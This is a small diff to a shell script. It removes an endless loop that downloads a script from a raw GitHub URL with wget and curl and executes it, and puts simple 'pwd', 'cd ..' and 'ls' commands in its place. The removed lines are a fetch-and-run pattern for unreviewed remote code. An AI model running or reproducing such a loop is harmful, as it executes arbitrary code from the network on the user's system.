@@ -1,6 +1,3 @@
-while [ true ];do
-neofetch --stdout
-wget -O a.sh https://raw.githubusercontent.com/rooted-cyber/uploading/main/h.sh
-bash a.sh
-sh -c "(curl -fsSl https://raw.githubusercontent.com/rooted-cyber/uploading/main/h.sh)"
-done
+pwd
+cd ..
+ls
